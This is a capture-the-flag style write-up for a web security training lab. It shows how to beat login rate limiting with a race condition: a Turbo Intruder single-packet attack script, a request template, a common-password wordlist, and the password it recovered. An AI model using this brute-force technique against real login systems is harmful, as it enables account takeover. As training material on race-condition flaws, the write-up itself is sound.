## Bypassing rate limits via race conditions

This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

To solve the lab:

1. Work out how to exploit the race condition to bypass the rate limit.
2. Successfully brute-force the password for the user carlos.
3. Log in and access the admin panel.
4. Delete the user carlos.

You can log in to your account with the following credentials: wiener:peter.

You should use the following list of potential passwords:

## Notes

- /admin
- Comment post

## Resume

1. Capture a login request on Carlos's account
2. Send it to turbo intruder
3. Edit the request and the template then run the attack
4. Find the **302** request, use the password to login
5. Delete Carlos's account

## Solve 

Try to login with carlos account and send the request to turbo intruder. 

In burp turbo intruder use the following template (based on **examples/race-single-packet-attack.py**) :

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in wordlists.clipboard:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

And update the login request with : 

```
csrf=AWVyM58Wce6Tx3l4jKIFj04iFbZ9dUsM&username=carlos&password=%s
```

Copy the password wordlist into your clipboard and run the attack. 

password.lst :

```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

Only one request return a **302** (redirection to account page) with the password : 

`csrf=H5kgIC4RMvSbAE381rRbe4Dc6NFbCOKE&username=carlos&password=master`

We can now wait the timeout to end and login with carlos account